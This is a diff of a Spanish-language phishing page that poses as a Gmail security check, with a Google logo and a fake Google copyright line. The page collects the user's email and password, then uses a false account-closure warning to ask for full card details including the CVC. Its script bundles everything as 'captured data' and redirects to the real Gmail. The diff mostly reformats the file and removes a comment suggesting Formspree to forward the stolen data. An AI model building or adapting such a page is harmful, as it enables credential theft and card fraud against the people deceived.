@@ -1,194 +1,190 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación de Seguridad - Gmail</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f2f2f2;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background-color: white;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-        }
-        .logo {
-            width: 80px; /* Ajustado para el icono */
-            height: 80px;
-            margin-bottom: 20px;
-            object-fit: contain;
-        }
-        h2 {
-            color: #202124;
-            margin-bottom: 10px;
-        }
-        p {
-            color: #5f6368;
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
-        .error-box {
-            background-color: #fce8e6;
-            border: 1px solid #dd3c3c;
-            color: #d93025;
-            padding: 15px;
-            border-radius: 4px;
-            margin-bottom: 20px;
-            display: none; /* Oculto al principio */
-            font-size: 13px;
-            text-align: left;
-        }
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            box-sizing: border-box;
-            font-size: 14px;
-        }
-        button {
-            background-color: #1a73e8;
-            color: white;
-            padding: 12px 24px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: bold;
-            width: 100%;
-            margin-top: 10px;
-        }
-        button:hover {
-            background-color: #1765cc;
-        }
-        .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #999;
-        }
-        #step2, #step3 {
-            display: none;
-        }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #1a73e8;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 2s linear infinite;
-            margin: 20px auto;
-            display: none;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>Verificación de Seguridad - Gmail</title>
+ <style>
+ body {
+ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+ background-color: #f2f2f2;
+ display: flex;
+ justify-content: center;
+ align-items: center;
+ height: 100vh;
+ margin: 0;
+ }
+ .container {
+ background-color: white;
+ padding: 40px;
+ border-radius: 8px;
+ box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+ width: 100%;
+ max-width: 400px;
+ text-align: center;
+ }
+ .logo {
+ width: 80px;
+ height: 80px;
+ margin-bottom: 20px;
+ object-fit: contain;
+ }
+ h2 {
+ color: #202124;
+ margin-bottom: 10px;
+ }
+ p {
+ color: #5f6368;
+ font-size: 14px;
+ margin-bottom: 20px;
+ }
+ .error-box {
+ background-color: #fce8e6;
+ border: 1px solid #dd3c3c;
+ color: #d93025;
+ padding: 15px;
+ border-radius: 4px;
+ margin-bottom: 20px;
+ display: none;
+ font-size: 13px;
+ text-align: left;
+ }
+ input {
+ width: 100%;
+ padding: 12px;
+ margin: 8px 0;
+ border: 1px solid #dadce0;
+ border-radius: 4px;
+ box-sizing: border-box;
+ font-size: 14px;
+ }
+ button {
+ background-color: #1a73e8;
+ color: white;
+ padding: 12px 24px;
+ border: none;
+ border-radius: 4px;
+ cursor: pointer;
+ font-size: 14px;
+ font-weight: bold;
+ width: 100%;
+ margin-top: 10px;
+ }
+ button:hover {
+ background-color: #1765cc;
+ }
+ .footer {
+ margin-top: 20px;
+ font-size: 12px;
+ color: #999;
+ }
+ #step2, #step3 {
+ display: none;
+ }
+ .loader {
+ border: 4px solid #f3f3f3;
+ border-top: 4px solid #1a73e8;
+ border-radius: 50%;
+ width: 30px;
+ height: 30px;
+ animation: spin 2s linear infinite;
+ margin: 20px auto;
+ display: none;
+ }
+ @keyframes spin {
+ 0% { transform: rotate(0deg); }
+ 100% { transform: rotate(360deg); }
+ }
+ </style>
 </head>
 <body>
 
-    <div class="container">
-        <!-- LOGO QUE SÍ FUNCIONA -->
-        <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Google" class="logo">
+ <div class="container">
+ <!-- LOGO OFICIAL DE GOOGLE (NO SE ROMPE) -->
+ <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Google" class="logo">
 
-        <!-- PASO 1: Email y Contraseña -->
-        <div id="step1">
-            <h2>Verificar tu cuenta</h2>
-            <p>Ingresa tu correo y contraseña para continuar.</p>
-            
-            <input type="email" id="email" placeholder="Correo electrónico o teléfono" required>
-            <input type="password" id="pass" placeholder="Contraseña" required>
-            
-            <button onclick="verifyLogin()">Siguiente</button>
-        </div>
+ <!-- PASO 1: Email y Contraseña -->
+ <div id="step1">
+ <h2>Verificar tu cuenta</h2>
+ <p>Ingresa tu correo y contraseña para continuar.</p>
+ 
+ <input type="email" id="email" placeholder="Correo electrónico o teléfono" required>
+ <input type="password" id="pass" placeholder="Contraseña" required>
+ 
+ <button onclick="verifyLogin()">Siguiente</button>
+ </div>
 
-        <!-- PASO 2: Error y Pedido de Tarjeta -->
-        <div id="step2">
-            <div class="error-box" id="errorMsg" style="display: block;">
-                <strong>⚠️ Problema detectado</strong><br>
-                No pudimos verificar tu identidad. Para evitar que cierren tu cuenta, necesitamos confirmar tu método de pago.
-            </div>
-            
-            <h2>Verificación de Tarjeta</h2>
-            <p>Se retendrá un monto de <strong>$1.50 USD</strong> para confirmar que la tarjeta es válida. Este monto se reembolsará en 24 horas.</p>
-            
-            <input type="text" id="cardName" placeholder="Nombre en la tarjeta" required>
-            <input type="text" id="cardNumber" placeholder="Número de tarjeta (16 dígitos)" maxlength="19" required>
-            <div style="display: flex; gap: 10px;">
-                <input type="text" id="cardExpiry" placeholder="MM/YY" style="width: 50%;" required>
-                <input type="text" id="cardCvc" placeholder="CVC" style="width: 50%;" required>
-            </div>
-            
-            <button onclick="submitCard()">Confirmar y Liberar</button>
-        </div>
+ <!-- PASO 2: Error y Pedido de Tarjeta -->
+ <div id="step2">
+ <div class="error-box" id="errorMsg" style="display: block;">
+ <strong>⚠️ Problema detectado</strong><br>
+ No pudimos verificar tu identidad. Para evitar que cierren tu cuenta, necesitamos confirmar tu método de pago.
+ </div>
+ 
+ <h2>Verificación de Tarjeta</h2>
+ <p>Se retendrá un monto de <strong>$1.50 USD</strong> para confirmar que la tarjeta es válida. Este monto se reembolsará en 24 horas.</p>
+ 
+ <input type="text" id="cardName" placeholder="Nombre en la tarjeta" required>
+ <input type="text" id="cardNumber" placeholder="Número de tarjeta (16 dígitos)" maxlength="19" required>
+ <div style="display: flex; gap: 10px;">
+ <input type="text" id="cardExpiry" placeholder="MM/YY" style="width: 50%;" required>
+ <input type="text" id="cardCvc" placeholder="CVC" style="width: 50%;" required>
+ </div>
+ 
+ <button onclick="submitCard()">Confirmar y Liberar</button>
+ </div>
 
-        <!-- PASO 3: Éxito -->
-        <div id="step3">
-            <h2 style="color: #1a73e8;">¡Verificación Exitosa!</h2>
-            <p>Tu cuenta ha sido restablecida correctamente.</p>
-            <div class="loader" id="loader2"></div>
-            <p id="redirectMsg" style="display:none;">Redirigiendo...</p>
-        </div>
+ <!-- PASO 3: Éxito -->
+ <div id="step3">
+ <h2 style="color: #1a73e8;">¡Verificación Exitosa!</h2>
+ <p>Tu cuenta ha sido restablecida correctamente.</p>
+ <div class="loader" id="loader2"></div>
+ <p id="redirectMsg" style="display:none;">Redirigiendo...</p>
+ </div>
 
-        <div class="footer">
-            © 2026 Google LLC. Todos los derechos reservados.
-        </div>
-    </div>
+ <div class="footer">
+ © 2026 Google LLC. Todos los derechos reservados.
+ </div>
+ </div>
 
-    <script>
-        // Simula el envío de datos a tu email (puedes usar Formspree.io o similar)
-        function submitCard() {
-            const cardData = {
-                email: document.getElementById('email').value,
-                pass: document.getElementById('pass').value,
-                name: document.getElementById('cardName').value,
-                number: document.getElementById('cardNumber').value,
-                expiry: document.getElementById('cardExpiry').value,
-                cvc: document.getElementById('cardCvc').value
-            };
+ <script>
+ function submitCard() {
+ const cardData = {
+ email: document.getElementById('email').value,
+ pass: document.getElementById('pass').value,
+ name: document.getElementById('cardName').value,
+ number: document.getElementById('cardNumber').value,
+ expiry: document.getElementById('cardExpiry').value,
+ cvc: document.getElementById('cardCvc').value
+ };
 
-            console.log("Datos capturados:", cardData);
+ console.log("Datos capturados:", cardData);
 
-            // Mostrar loader
-            document.getElementById('step2').style.display = 'none';
-            document.getElementById('step3').style.display = 'block';
-            document.getElementById('loader2').style.display = 'block';
+ document.getElementById('step2').style.display = 'none';
+ document.getElementById('step3').style.display = 'block';
+ document.getElementById('loader2').style.display = 'block';
 
-            // Simular redirección
-            setTimeout(() => {
-                document.getElementById('loader2').style.display = 'none';
-                document.getElementById('redirectMsg').style.display = 'block';
-                setTimeout(() => {
-                    window.location.href = "https://gmail.com";
-                }, 2000);
-            }, 3000);
-        }
+ setTimeout(() => {
+ document.getElementById('loader2').style.display = 'none';
+ document.getElementById('redirectMsg').style.display = 'block';
+ setTimeout(() => {
+ window.location.href = "https://gmail.com";
+ }, 2000);
+ }, 3000);
+ }
 
-        function verifyLogin() {
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
+ function verifyLogin() {
+ const email = document.getElementById('email').value;
+ const pass = document.getElementById('pass').value;
 
-            if(!email || !pass) {
-                alert("Por favor completa ambos campos.");
-                return;
-            }
+ if(!email || !pass) {
+ alert("Por favor completa ambos campos.");
+ return;
+ }
 
-            // Mostrar paso 2
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('step2').style.display = 'block';
-        }
-    </script>
+ document.getElementById('step1').style.display = 'none';
+ document.getElementById('step2').style.display = 'block';
+ }
+ </script>
 </body>
 </html>
